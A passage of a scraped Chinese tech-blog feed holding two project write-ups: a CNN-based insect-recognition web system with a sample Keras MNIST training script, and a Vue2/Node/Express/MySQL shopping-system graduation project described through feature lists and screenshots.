                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、介绍</h2>
<p>昆虫识别系统，本项目为一款基于深度学习的昆虫识别系统，融合当前人工智能技术热点，针对10种常见昆虫（包括蜜蜂、甲虫、蝴蝶、蝉、蜻蜓、蚱蜢、蛾、蝎子、蜗牛、蜘蛛）构建数据集，采用卷积神经网络（CNN）进行模型训练，最终实现了高精度的图像识别模型，并搭建了完整的Web端操作平台。</p>
<p><strong>前端</strong>: Vue3、Element Plus</p>
<p><strong>后端</strong>：Django</p>
<p><strong>算法</strong>：TensorFlow、卷积神经网络算法</p>
<p><strong>具体功能</strong>：</p>
<ol>
<li>系统分为管理员和用户两个角色，登录后根据角色显示其可访问的页面模块。</li>
<li>登录系统后可发布、查看、编辑文章，创建文章功能中集成了markdown编辑器，可对文章进行编辑。</li>
<li>在图像识别功能中，用户上传图片后，点击识别，可输出其识别结果和置信度</li>
<li>基于Echart以柱状图形式输出所有种类对应的置信度分布图。</li>
<li>在智能问答功能模块中：用户输入问题，后台通过对接Deepseek接口实现智能问答功能。</li>
<li>管理员可在用户管理模块中，对用户账户进行管理和编辑。</li>
</ol>
<p><strong>前端</strong>: Vue3、Element Plus</p>
<p><strong>后端</strong>：Django</p>
<p><strong>算法</strong>：TensorFlow、卷积神经网络算法</p>
<p><strong>选题背景与意义</strong>
随着人工智能技术的飞速发展，深度学习在图像识别领域展现出巨大潜力。昆虫作为地球上种类最繁多的生物群体，其准确识别对农业、生态研究及科普教育具有重要意义。然而，传统识别方法依赖专家经验，效率低下且门槛较高。为此，本项目旨在开发一款基于深度学习的昆虫识别系统。系统聚焦十种常见昆虫，利用卷积神经网络（CNN）构建高精度识别模型，并通过集成Vue3与Django的Web平台，为用户提供便捷的图像识别、置信度可视化以及智能问答等一站式服务。这不仅推动了AI技术的实际应用，也为昆虫学研究与普及提供了高效的数字化工具。</p>
<h2 data-id="heading-1">二、系统效果图片展示</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/113a9e17933547a38c9c3c658ea769d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeml3dQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832007&amp;x-signature=U2Y1eFmZKFvyX4XE3bthangqOcY%3D" alt="图片" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0978217f03924203a69078b5efa5a95e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeml3dQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832007&amp;x-signature=6duipuJ0ak23CHVAhsXKAZcm0TQ%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-2">三、演示视频 and 完整代码 and 安装</h2>
<p>地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fziwupy.cn%2Fp%2FkFy9pd" target="_blank" title="https://ziwupy.cn/p/kFy9pd" ref="nofollow noopener noreferrer">ziwupy.cn/p/kFy9pd</a></p>
<h2 data-id="heading-3">四、卷积神经网络算法介绍</h2>
<p>卷积神经网络（Convolutional Neural Network, CNN）是一种专为处理网格状数据（如图像）而设计的深度学习算法。其核心思想在于通过“卷积”操作，自动提取图像从低级到高级的层次化特征。</p>
<p>CNN主要由以下关键层构成：</p>
<ol>
<li><strong>卷积层</strong>：使用多个可学习的滤波器（或称卷积核）在输入图像上滑动，通过计算局部区域的点积来提取特征（如边缘、角点、纹理）。这极大地减少了参数数量并保留了像素间的空间关系。</li>
<li><strong>池化层</strong>：通常在卷积层之后，用于对特征图进行下采样（如最大池化），保留最显著特征的同时降低数据维度和计算复杂度，增强模型的平移不变性。</li>
<li><strong>全连接层</strong>：在网络的末端，将经过多次卷积和池化后提取到的展开特征进行整合，并映射到最终的输出层（如分类任务中的Softmax层）以完成分类或识别。</li>
</ol>
<p>通过堆叠这些层，CNN能够从原始像素中逐步学习到越来越复杂和抽象的特征，最终实现高效的图像识别。</p>
<p>以下是一个使用TensorFlow和Keras API构建一个简单CNN模型，并在MNIST手写数字数据集上进行训练的示例。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf
<span class="hljs-keyword">from</span> tensorflow.keras <span class="hljs-keyword">import</span> datasets, layers, models

<span class="hljs-comment"># 1. 加载并预处理数据</span>
(train_images, train_labels), (test_images, test_labels) = datasets.mnist.load_data()
<span class="hljs-comment"># 将图像重塑为 (28, 28, 1) 并归一化像素值</span>
train_images = train_images.reshape((<span class="hljs-number">60000</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>)).astype(<span class="hljs-string">'float32'</span>) / <span class="hljs-number">255</span>
test_images = test_images.reshape((<span class="hljs-number">10000</span>, <span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>)).astype(<span class="hljs-string">'float32'</span>) / <span class="hljs-number">255</span>

<span class="hljs-comment"># 2. 构建CNN模型</span>
model = models.Sequential([
    <span class="hljs-comment"># 第一个卷积块</span>
    layers.Conv2D(<span class="hljs-number">32</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">'relu'</span>, input_shape=(<span class="hljs-number">28</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>)),
    layers.MaxPooling2D((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)),
    <span class="hljs-comment"># 第二个卷积块</span>
    layers.Conv2D(<span class="hljs-number">64</span>, (<span class="hljs-number">3</span>, <span class="hljs-number">3</span>), activation=<span class="hljs-string">'relu'</span>),
    layers.MaxPooling2D((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)),
    <span class="hljs-comment"># 分类器</span>
    layers.Flatten(),
    layers.Dense(<span class="hljs-number">64</span>, activation=<span class="hljs-string">'relu'</span>),
    layers.Dense(<span class="hljs-number">10</span>, activation=<span class="hljs-string">'softmax'</span>) <span class="hljs-comment"># 10个数字类别，输出概率分布</span>
])

<span class="hljs-comment"># 3. 编译模型</span>
model.<span class="hljs-built_in">compile</span>(optimizer=<span class="hljs-string">'adam'</span>,
              loss=<span class="hljs-string">'sparse_categorical_crossentropy'</span>,
              metrics=[<span class="hljs-string">'accuracy'</span>])

<span class="hljs-comment"># 4. 训练模型</span>
model.fit(train_images, train_labels, epochs=<span class="hljs-number">5</span>, 
          validation_data=(test_images, test_labels))

<span class="hljs-comment"># 5. 评估模型</span>
test_loss, test_acc = model.evaluate(test_images, test_labels, verbose=<span class="hljs-number">2</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f'\nTest accuracy: <span class="hljs-subst">{test_acc}</span>'</span>)
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ac7ba6f312406c850ff502dc725b56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeml3dQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832007&amp;x-signature=e4oovUGuvmivpjoBuwpeoXGm14I%3D" alt="图片" loading="lazy"/></p>
<p>这个流程图清晰地展示了CNN进行图像识别的三个核心步骤：</p>
<ol>
<li><strong>卷积层</strong>：接收输入图像，使用卷积核自动扫描并提取局部特征（如边缘、纹理）。</li>
<li><strong>池化层</strong>：对卷积层输出的特征图进行下采样，保留最关键信息，减少计算量并增强模型稳定性。</li>
<li><strong>全连接层</strong>：将经过多次卷积和池化后学习到的高级特征进行整合，并映射到最终的输出类别，完成图像分类。</li>
</ol>
<p>在实际应用中，模型通常会堆叠多个“卷积-池化”层组以学习更复杂的特征，但以上三个环节构成了最核心、不可或缺的识别流程。您的昆虫识别系统正是基于此流程，通过训练让网络学会区分10种不同昆虫的特征。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue2 + node + express + MySQL 5.7 的购物系统]]></title>    <link>https://juejin.cn/post/7576929700842668041</link>    <guid>https://juejin.cn/post/7576929700842668041</guid>    <pubDate>2025-11-27T07:08:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576929700842668041" data-draft-id="7577016562251907123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue2 + node + express + MySQL 5.7 的购物系统"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-27T07:08:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="执念坚持"/> <meta itemprop="url" content="https://juejin.cn/user/422649862826327"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue2 + node + express + MySQL 5.7 的购物系统
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/422649862826327/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    执念坚持
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:08:34.000Z" title="Thu Nov 27 2025 07:08:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">声明，该项目，可作为计算机的毕业设计；</h3>
<h2 data-id="heading-1">架构</h2>
<pre><code class="hljs language-diff" lang="diff"><span class="hljs-deletion">- 前端：vue2 + vuex + vueRouter + vuecli + axios + sass + less</span>
<span class="hljs-deletion">- 后端： node + express + 中间件</span>
<span class="hljs-deletion">- 数据库：MySQL 5.7</span>
</code></pre>
<h2 data-id="heading-2">功能如下</h2>
<h3 data-id="heading-3">前台功能</h3>
<ul>
<li>注册、登录（账号，验证码登录注册）</li>
<li>商品
<ul>
<li>商品分类</li>
<li>商品搜索</li>
<li>简单展示商品</li>
<li>查看商品详情</li>
<li>商品评论，追加评论</li>
</ul>
</li>
<li>分页功能</li>
<li>定位 、自主选择所在城市</li>
<li>购物车功能
<ul>
<li>加入购物车</li>
<li>购物车商品数量增减</li>
<li>清空购物车</li>
<li>商品结算</li>
</ul>
</li>
<li>支付功能</li>
<li>订单页面
<ul>
<li>下单未支付（超时管理员可删除订单）</li>
<li>下单未发货</li>
<li>下单，收货完成后，可评论，追加评论</li>
</ul>
</li>
<li>搜索商品</li>
<li>用户个人中心
<ul>
<li>修改用户信息</li>
<li>修改手机号</li>
<li>修改密码</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">后台功能</h3>
<ul>
<li>登录</li>
<li>查看商品信息</li>
<li>商品上架</li>
<li>用户管理</li>
<li>商品的增删改查</li>
<li>订单管理</li>
<li>评论管理</li>
</ul>
<h2 data-id="heading-5">项目挑选功能的运行效果</h2>
<h3 data-id="heading-6">前台功能效果</h3>
<ol>
<li>登录注册页面
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5962c5842a2d45c296a9b15f7aaf145a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=rZ7mcXvqF88hYgHBcvFwjclFkTc%3D" alt="image.png" loading="lazy"/></li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d22359b7a79f4b05b11189bd494ed2e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=BAgRI%2Bg5s23TRaz3que7oJZl8gk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/701c00859f6b44acac8799b5e29ae6dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=oUmz6bVLNypR4tldFDT%2BXsda%2FCc%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>首页</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cd5d1961a29459d999cc126e6b9f657~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=fvxiWDMu4bQyKajpkYU1OyCuCnk%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78402a6a90c9406999c72943bd2435e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=ijeBRjDM%2BzjueRZzr%2BoSgGEJS2M%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>搜索</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59a126dd456642e5bc518d2492dfe367~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=Y8nXtOkMuE9Uz9LD4z4tfREdmqI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c45620d104e546d68004b204ad85732f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=AJwaKJ0gKvIKpJLpmvl4uid5Jl4%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>购物车</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c49266aa38034c55b0b5b4b497b83c3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=Tvh5InpK8y%2BNjw97kzyryGumpDc%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>支付功能</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a72e0a24523148009dab1cbaf70228f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=ak0vCz3wnc8uZuTHrGjF2qO9bgY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/80154be22849483cacc12d988e783a1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=%2BePdyNa4DAZYMaco3fdDv4FtDtA%3D" alt="image.png" loading="lazy"/></p>
<ol start="6">
<li>订单功能</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9ad69346ba948429c6ce7cba7f820f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=qxfHBc%2BKkXZkbWq72RLGchyqbDM%3D" alt="image.png" loading="lazy"/></p>
<p>。。。。 前台功能挑选演示，就演示到这</p>
<h3 data-id="heading-7">后台功能效果</h3>
<ol>
<li>登录</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/267a067be2674e858e54bc20239e91a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=TMnQwTJsud7orPznOaVbBbVkM9A%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>首页</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/230fabe25b0b4c6c994eeaec0d67e394~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=BysnpyVgLi2oSmXLJ16nKd%2BPeo8%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>商品上架</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dbd158c50bd4d2aa1e6477f9391a6f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=KH69%2FUiBiiFCAWv3mpgW9nSqTO8%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>订单管理</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abd15f4ccb92446993f29ffdff5923b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=TvYrdWkWsrGbCmM2S4M4v5RpTAE%3D" alt="image.png" loading="lazy"/></p>
<ol start="5">
<li>评论管理</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d38d61c2a8c48faa4d7c2e8ac03e33c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=Hgne9xzexow7Rc%2FjSJBDLBWmtOo%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">代码展示</h3>
<h3 data-id="heading-9">前端代码</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a1575353b0b40a0886f64594e2bcac9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=gg6mMS99Kt6BzuF1gKVa14AfhLI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">后端代码</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93ba8b650aea48fcad15da176fc6014a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=3bUXiBkgEi8teRgbFv02PPm2o%2FE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-11">mysql 数据表</h3>
